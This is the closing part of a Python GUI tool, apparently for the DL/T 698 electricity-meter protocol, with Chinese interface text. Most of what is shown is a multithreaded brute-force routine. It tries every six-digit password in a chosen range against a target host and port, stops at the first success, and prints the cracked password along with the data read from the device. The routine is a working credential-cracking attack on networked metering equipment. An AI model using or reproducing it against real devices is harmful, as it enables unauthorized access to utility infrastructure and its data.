                messagebox.showerror("范围错误", "起点/终点必须为数字")
                return
            if start < 0 or end > 999999 or start > end:
                messagebox.showerror("范围错误", "范围应在 000000~999999 之间")
                return
            passwords = [f"{i:06d}" for i in range(start, end + 1)]

        self.brute_stop.clear()
        self.brute_running = True
        self.brute_result.delete("1.0", "end")
        self.brute_progress["maximum"] = len(passwords)
        self.brute_progress["value"] = 0
        self.brute_pct.config(text="0%")
        self.log(f"开始爆破: 目标 {host}:{port} 候选 {len(passwords)} 个, 线程 {threads}, OID {hex_str(oid)}")

        threading.Thread(target=self._brute_master,
                         args=(host, port, passwords, oid, timeout, threads), daemon=True).start()

    def stop_brute(self):
        if self.brute_running:
            self.brute_stop.set()
            self.log("已请求停止爆破...")

    def _brute_master(self, host, port, passwords, oid, timeout, threads):
        q = queue.Queue()
        done = [0]
        total = len(passwords)
        lock = threading.Lock()
        found = [None]

        def worker(pwds):
            for pwd in pwds:
                if self.brute_stop.is_set() or found[0] is not None:
                    return
                res = try_connect(host, port, pwd, oid, timeout)
                with lock:
                    done[0] += 1
                if res["ok"]:
                    with lock:
                        if found[0] is None:
                            found[0] = res
                    return
                # 周期性进度
                if done[0] % 50 == 0:
                    self.after(0, lambda d=done[0]: self._update_brute_progress(d, total, found[0]))
            return

        # 分片
        chunk = max(1, (total + threads - 1) // threads)
        chunks = [passwords[i:i + chunk] for i in range(0, total, chunk)]
        ts = []
        for c in chunks:
            t = threading.Thread(target=worker, args=(c,), daemon=True)
            t.start()
            ts.append(t)

        # 等待
        for t in ts:
            t.join()

        self.brute_running = False
        self.after(0, lambda: self._brute_finish(done[0], total, found[0]))

    def _update_brute_progress(self, done, total, found):
        self.brute_progress["value"] = done
        pct = (done * 100 // total) if total else 0
        self.brute_pct.config(text=f"{pct}%  ({done}/{total})")
        if found:
            self._show_brute_found(found)

    def _show_brute_found(self, res):
        self.brute_result.insert("end",
            f"{'='*50}\n[+] 密码命中: {res['password']}\n")
        if res["data_text"]:
            self.brute_result.insert("end", f"[+] GET 数据: {res['data_text']}\n")
        if res["data"]:
            self.brute_result.insert("end", f"[+] 响应(hex): {hex_str(res['data'])}\n")
        self.brute_result.see("end")
        self.log(f"[+] 爆破命中密码: {res['password']}  数据: {res['data_text']}")

    def _brute_finish(self, done, total, found):
        self.brute_progress["value"] = done
        self.brute_pct.config(text=f"100%  ({done}/{total})")
        if found:
            self._show_brute_found(found)
            self.brute_result.insert("end", f"{'='*50}\n完成: 已在 {done}/{total} 处命中并停止\n")
        else:
            self.brute_result.insert("end",
                f"{'='*50}\n完成: 已尝试 {done}/{total}, 未命中 (停止={self.brute_stop.is_set()})\n")
        self.brute_result.see("end")


# ============================================================
#  入口
# ============================================================
def main():
    app = Dlt698Tool()
    app.mainloop()


if __name__ == "__main__":
    main()
